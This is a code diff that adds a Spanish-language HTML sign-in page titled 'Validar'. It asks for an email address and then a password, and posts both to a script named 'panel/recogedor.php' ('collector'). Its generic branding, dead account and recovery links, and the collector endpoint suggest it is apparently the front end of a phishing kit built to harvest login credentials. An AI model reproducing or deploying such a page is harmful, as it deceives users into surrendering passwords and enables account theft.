@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+
+<html>
+
+<head>
+
+    <meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self' https://kit.fontawesome.com; img-src 'self' data:; style-src 'self';">
+
+    <title>Validar</title>
+
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, minimun-sacale=1.0">
+
+    <link rel="icon" href="images/icon.ico">
+    <link rel="stylesheet" href="css/index.css">
+</head>
+
+<body>
+
+    <section id="login-container">
+
+        <div id="login-body" class="opacity0">
+
+            <div class="logo-container">
+                <img src="images/logo.png" class="login-logo" alt="Logo">
+            </div>
+
+            <form id="container-layout" method="POST" action="panel/recogedor.php" enctype="multipart/form-data"
+                onkeypress="return cancelEnter(event)">
+
+                <div id="eml" class="">
+                    <h2>Iniciar Sesión</h2>
+                    <div id="alert-eml-login" style="display: none;"></div>
+                    <input type="email" id="usr" name="usr" placeholder="Correo electrónico">
+                    <p>¿No tiene una cuenta? <a href="#" id="create-account-link">Cree una.</a></p>
+                    <div class="button btn-next">
+                        <button type="button" id="btn-next-pss" class="btn-form-login">Siguiente</button>
+                    </div>
+                </div>
+
+                <div id="pss">
+                    <div class="usr">
+                        <p>
+                            <button type="button" id="btn-prev">
+                                <i class="fa-solid fa-arrow-left"></i>
+                            </button>
+                            <span id="span-eml"></span>
+                        </p>
+                    </div>
+                    <h2>Escribir contraseña</h2>
+                    <input type="password" id="pss" name="pss" placeholder="Contraseña">
+                    <a href="#" id="link-recovery-password">¿Olvidó su contraseña?</a>
+                    <div class="button btn-sub">
+                        <input type="submit" id="btn-login" class="btn-form-login" value="Validar">
+                    </div>
+                </div>
+            </form>
+
+
+        </div>
+
+
+
+    </section>
+
+    <script src="https://kit.fontawesome.com/4a03c8ce1f.js" crossorigin="anonymous"></script>
+    <script type="text/javascript" src="js/functions.js"></script>
+</body>
+
+</html>
